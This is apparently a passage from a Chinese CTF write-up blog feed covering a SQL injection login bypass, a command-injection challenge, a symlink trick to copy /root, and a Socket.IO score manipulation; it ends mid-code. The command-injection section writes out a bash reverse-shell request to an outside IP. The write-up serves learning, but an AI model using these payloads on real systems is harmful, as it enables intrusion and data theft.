<span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'fake'</span> <span class="token operator">OR</span> username <span class="token operator">LIKE</span> <span class="token string">'hacker%'</span> <span class="token comment">#' AND password = '...';</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>'fake' OR username LIKE 'hacker%'</code>：通过<code>OR</code>使条件恒真，可查询所有用户名以<code>hacker</code>开头的用户。</li><li><code>#</code>：注释掉后续的密码验证部分，绕过登录验证。</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/de92f29c87112ff359a5a2c2978318d7.png"></p><hr><h3 id="WEB-RE-Just-Ping-Part-1"><a href="#WEB-RE-Just-Ping-Part-1" class="headerlink" title="[WEB+RE]Just Ping Part 1"></a>[WEB+RE]Just Ping Part 1</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token keyword">const</span> targetInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'targetInput'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">const</span> pingButton <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'pingButton'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">const</span> stopButton <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'stopButton'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">const</span> output <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'output'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">let</span> controller <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>           <span class="token comment">// 自动滚动到底部</span>           <span class="token keyword">function</span> <span class="token function">scrollToBottom</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               output<span class="token punctuation">.</span>scrollTop <span class="token operator">=</span> output<span class="token punctuation">.</span>scrollHeight<span class="token punctuation">;</span>           <span class="token punctuation">}</span>           <span class="token comment">// 清除输出</span>           <span class="token keyword">function</span> <span class="token function">clearOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               output<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>           <span class="token comment">// 开始 ping</span>           pingButton<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token keyword">const</span> target <span class="token operator">=</span> targetInput<span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>target<span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'请输入有效的 IP 地址或域名'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">return</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span>               <span class="token function">clearOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               pingButton<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>               stopButton<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>               targetInput<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>               <span class="token comment">// 使用 AbortController 来控制请求</span>               controller <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AbortController</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">const</span> signal <span class="token operator">=</span> controller<span class="token punctuation">.</span>signal<span class="token punctuation">;</span>               <span class="token keyword">try</span> <span class="token punctuation">{</span>                   <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/api/ping?target=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">{</span>                       signal                   <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>response<span class="token punctuation">.</span>ok<span class="token punctuation">)</span> <span class="token punctuation">{</span>                       <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">请求失败: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>response<span class="token punctuation">.</span>status<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token punctuation">}</span>                   <span class="token keyword">const</span> reader <span class="token operator">=</span> response<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">getReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">const</span> decoder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                       <span class="token keyword">const</span> <span class="token punctuation">{</span> done<span class="token punctuation">,</span> value <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">await</span> reader<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token keyword">if</span> <span class="token punctuation">(</span>done<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>                       <span class="token keyword">const</span> text <span class="token operator">=</span> decoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                       output<span class="token punctuation">.</span>textContent <span class="token operator">+=</span> text<span class="token punctuation">;</span>                       <span class="token function">scrollToBottom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token punctuation">}</span>               <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">.</span>name <span class="token operator">!==</span> <span class="token string">'AbortError'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                       output<span class="token punctuation">.</span>textContent <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">\n错误: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>error<span class="token punctuation">.</span>message<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">\n</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>                       <span class="token function">scrollToBottom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token punctuation">}</span>               <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>                   pingButton<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                   stopButton<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                   targetInput<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                   controller <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span>           <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// 停止 ping</span>           stopButton<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>controller<span class="token punctuation">)</span> <span class="token punctuation">{</span>                   controller<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span>               pingButton<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>               stopButton<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>               targetInput<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// 按回车键触发 ping</span>           targetInput<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'keypress'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>key <span class="token operator">===</span> <span class="token string">'Enter'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>pingButton<span class="token punctuation">.</span>disabled<span class="token punctuation">)</span> <span class="token punctuation">{</span>                   pingButton<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span>           <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 测试开发API</span>       document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'testApiButton'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token keyword">const</span> cmd <span class="token operator">=</span> targetInput<span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'请输入测试命令'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">return</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>           <span class="token function">clearOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           testApiButton<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>           targetInput<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>           <span class="token keyword">try</span> <span class="token punctuation">{</span>               <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/api/testDevelopApi?cmd=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>response<span class="token punctuation">.</span>ok<span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">请求失败: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>response<span class="token punctuation">.</span>status<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span>               <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               output<span class="token punctuation">.</span>textContent <span class="token operator">=</span> data<span class="token punctuation">;</span>               <span class="token function">scrollToBottom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>               output<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">错误: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>error<span class="token punctuation">.</span>message<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>               <span class="token function">scrollToBottom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>               testApiButton<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>               targetInput<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>       <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> testDevelopApi 会 Pool Get 和 Pool Put，初始 Pool 中的为  Plain Text ping  ，当⽤ <code>/api/testDevelopApi</code>  多次请求，把 Pool 中的对象全部⽤尽，ping 的时候就会使⽤之前传的对象</p><p>在经过偶然性的测试发现，在<code>testDevelopApi</code>里输入的命令，到<code>ping</code>里面会执行</p><p>这里就猜测，<code>testDevelopApi</code>接收的命令会覆盖掉<code>ping</code>里面的预置命令，这个命令就类似下面这种</p><pre class="line-numbers language-none"><code class="language-none">exec.Command("ping","-c","4" ip)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以发现两个api共享同⼀个命令字符串pool  ，复⽤  对象 在⽹⻚端可以看到调⽤  这个 api 有回显，由于pool被复⽤，调⽤  后，⽹⻚端点击开始，  的命令可能被  的 api 复⽤，进⽽被执⾏ cmd 限制四段参数，所以⽤ bash -c 绕过限制，反弹 shell </p><pre class="line-numbers language-none"><code class="language-none">GET /api/testDevelopApi?cmd={{urlenc(bash -c 'bash -i &gt;&amp; /dev/tcp/47.104.232.51/7777 0&gt;&amp;1' &gt;)}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 多发送⼏次请求后，⽹⻚点击 开始Ping</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/15392dbd084f42f398e23933c809f367.png"></p><hr><h3 id="WEB-RE-Just-Ping-Part-2"><a href="#WEB-RE-Just-Ping-Part-2" class="headerlink" title="[WEB+RE]Just Ping Part 2"></a>[WEB+RE]Just Ping Part 2</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/local/etc/<span class="token function">mkdir</span> <span class="token builtin class-name">test</span><span class="token function">mv</span> backup <span class="token builtin class-name">test</span><span class="token function">ln</span> <span class="token parameter variable">-s</span> test/backup backup<span class="token builtin class-name">echo</span> <span class="token string">'/root'</span><span class="token operator">&gt;</span>backupList<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ol><li><p><strong>切换目录</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/local/etc/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>切换到<code>/usr/local/etc/</code>目录（通常用于存放本地安装的程序配置文件）。</li></ul></li><li><p><strong>创建目录</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在当前目录下创建名为<code>test</code>的新目录。</li></ul></li><li><p><strong>移动文件 / 目录</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> backup <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>将当前目录下的<code>backup</code>文件（或目录）移动到<code>test</code>目录中，变为<code>test/backup</code>。</li><li>若<code>backup</code>原本存在，会被移入<code>test</code>目录；若不存在，此命令会报错。</li></ul></li><li><p><strong>创建符号链接</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> test/backup backup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建名为<code>backup</code>的符号链接（软链接），指向<code>test/backup</code>。</p><ul><li>此时，访问<code>backup</code>等同于访问<code>test/backup</code>。</li></ul></li><li><p><strong>写入文件</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'/root'</span><span class="token operator">&gt;</span>backupList<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>将字符串<code>/root</code>写入到当前目录下的<code>backupList</code>文件中（若文件不存在则创建，存在则覆盖）。</li></ul></li></ol></blockquote><p>读取  中的⽂件路径，将对应⽂件备份到  中 ，可以看到 backupList etc ⽂件没有写权限，但是  路径下任意可读可写可执⾏ backup <code>/usr/local/etc/next</code> 那么可以将  移动到  ⽂件夹中 <code>/usr/local/etc backup</code> 并在  下创建  的符号链接，并创建  backup </p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8615b6ccbd0cee4c007941a07c1866f6.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f84ec755223dafaa3f1d802821bdd8b5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/08ffa03e8e4ec2eb31352e7040586ac7.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>miniL</title>
      <link href="/2025/05/13/minil/"/>
      <url>/2025/05/13/minil/</url>
      
        <content type="html"><![CDATA[<h3 id="GuessOneGuess"><a href="#GuessOneGuess" class="headerlink" title="GuessOneGuess"></a>GuessOneGuess</h3><pre class="line-numbers language-none"><code class="language-none">// 1. 加载库if (typeof io === 'undefined') {  const script = document.createElement('script');  script.src = 'https://cdn.socket.io/4.7.2/socket.io.min.js';  document.head.appendChild(script);}// 2. 建立连接setTimeout(() =&gt; {  window.socket = io('http://127.0.0.1:46227/', { transports: ['websocket'] });  console.log('[√] 连接已建立');}, 3000);// 3. 发送100次错误猜测for (let i=0; i&lt;100; i++) {  setTimeout(() =&gt; window.socket.emit('guess', { value: 50 }), i*50);}// 在控制台立即执行socket.emit('punishment-response', { score: "-Infinity"});console.log('[+] 恶意分数已发送');socket.emit('guess', { value: 77 });<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果可在 f12-network 里面刚刚构建的 ws 连接看到</p><p><a href="https://blog.csdn.net/heshiyuan1406146854/article/details/137956140">chrome 浏览器 f12 如何查看 websocket 消息？_f12怎么查看websocket消息-CSDN博客</a></p><p>分数要大于<code>1.7976931348623157e308</code>才会给flag这个数恰恰是js中<code>Number.MAX_VALUE</code>，但是如果超过这个值就会变成<code>Infinity</code>，只有<code>Infinity&gt;Number.MAX_VALUE</code>才是<code>true</code>，</p><p>后端监听的<code>'punishment-response'</code>执行<code>totalScore -= data.score;</code>，而data是前端可控的，</p><p>但是直接<code>socket.emit('punishment-response', {  score: -1.8e308 });</code>只要这个数大于<code>Number.MAX_VALUE</code>（我们这里称为<code>Infinity</code>）,实际就是<code>socket.emit('punishment-response', {  score: -Infinity });</code>会失败，原因是</p><p>Socket.IO 在传输数据时使用的是 JSON 序列化。如果值是 <code>Infinity</code>、<code>-Infinity</code> 或 <code>NaN</code>，这些是 <strong>不能被 JSON 表示的</strong>，会被序列化成 <code>null</code></p><p><code>JSON.stringify({ score: -Infinity }); // '{"score":null}'</code>所以得让Socket.IO传输的时候正常传（不被序列化为无效值）</p><p>这里的解决办法是<code>{  score: "-Infinity" }</code>（字符串）或者发<code>-1e308</code>（小于<code>Number.MAX_VALUE</code>）多发几次后端一运算还是<code>Infinity</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">socket <span class="token operator">=</span> <span class="token function">io</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//socket.emit('punishment-response', {</span><span class="token comment">//  score: "-Infinity"</span><span class="token comment">//});或者下面的</span>socket<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'punishment-response'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  <span class="token literal-property property">score</span><span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1e308</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>socket<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'punishment-response'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  <span class="token literal-property property">score</span><span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1e308</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//猜对这里可二分法猜,手试二分法也ok,其实for循环爆也型</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> socket<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'guess'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>   <span class="token literal-property property">value</span><span class="token operator">:</span> i <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span>   <span class="token string">'game-message'</span><span class="token punctuation">,</span>   <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>塞控制台运行</p><hr><h3 id="Miniup"><a href="#Miniup" class="headerlink" title="Miniup"></a>Miniup</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$dufs_host</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$dufs_port</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'5000'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$allowed_extensions</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bmp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'webp'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$file_extension</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_extension</span><span class="token punctuation">,</span> <span class="token variable">$allowed_extensions</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'success'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'message'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'只允许上传图片文件'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">exit</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token variable">$target_url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://'</span> <span class="token operator">.</span> <span class="token variable">$dufs_host</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$dufs_port</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">rawurlencode</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$file_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$ch</span> 